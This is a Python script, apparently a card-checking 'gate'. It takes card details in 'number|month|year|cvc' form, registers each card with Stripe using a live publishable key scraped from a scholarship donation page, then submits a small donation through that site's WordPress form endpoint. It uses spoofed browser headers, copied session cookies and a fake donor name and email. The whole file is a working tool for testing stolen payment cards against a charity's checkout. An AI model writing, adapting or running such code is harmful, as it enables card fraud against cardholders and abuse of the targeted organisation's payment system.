import requests,re

def Tele(ccx):
    import requests
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:#Mo3gza
        yy = yy.split("20")[1]
    r = requests.session()
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    }
    
    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F698b2f41bb%3B+stripe-js-v3%2F698b2f41bb%3B+card-element&referrer=https%3A%2F%2Fstandrewshk.org&time_on_page=272135&key=pk_live_51HjfmHC6Cusp93TKl1UTLEiUyMTWL0F56dF1RB8Ql2LbLYQ3ymHBnsQl5oUMCeDZMXN9QUEn34qo25ISwvtV1dVY00Gf8NbxwG'
    
    r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    
    pm = r1.json()['id']
    
    cookies = {
        '__cf_bm': 'tYGL6a4UNQIIzY_kkQCTlEsGbbu8V4PRxK8K553eGXc-1740399658-1.0.1.1-G2vhUQpFMszc003ju73Oarafe.eMjg9gB0s.H.9y8rvxR_KRAwDRTiuiyxX5U8gH3ueV_Opl1guZVdeyiEMrDw',
        '_fbp': 'fb.2.1740399662778.157652016478123277',
        'cookieyes-consent': 'consentid:bzFQbnc3TUdrbTBTcWt0aG5lR2xsUXA4NE5IMFFEOWg,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes',
        '_ga_59B60VWWYG': 'GS1.1.1740399662.1.0.1740399662.0.0.1057425111',
        '_ga': 'GA1.1.1773205121.1740399663',
        '__stripe_mid': '65f4a43a-00d3-451c-a137-6554e80454d19017d8',
        '__stripe_sid': '79b69d9d-c1d7-4778-967e-a9b8a39da55b43fed0',
        '_gcl_au': '1.1.1127129083.1740399661.1033584891.1740399744.1740399744',
    }
    
    headers = {
        'authority': 'standrewshk.org',
        'accept': '*/*',
        'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://standrewshk.org',
        'referer': 'https://standrewshk.org/piping-and-drummjng-scholarship/',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    params = {
        't': '1744868425493',
    }
    
    data = {
        'data': 'item_45__fluent_sf=&__fluent_form_embded_post_id=2232&_fluentform_45_fluentformnonce=7e1d756418&_wp_http_referer=%2Fpiping-and-drummjng-scholarship%2F&names%5Bfirst_name%5D=Yoon&names%5Blast_name%5D=Holy&email=zeee496912%40gmail.com&custom-payment-amount=4&payment_method=stripe&__entry_intermediate_hash=0fa35cd96e32b4faef9bafae92b3fa8b&__stripe_payment_method_id='+str(pm)+'',
        'action': 'fluentform_submit',
        'form_id': '45',
    }
    
    r2 = requests.post('https://standrewshk.org/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
    
    return (r2.json())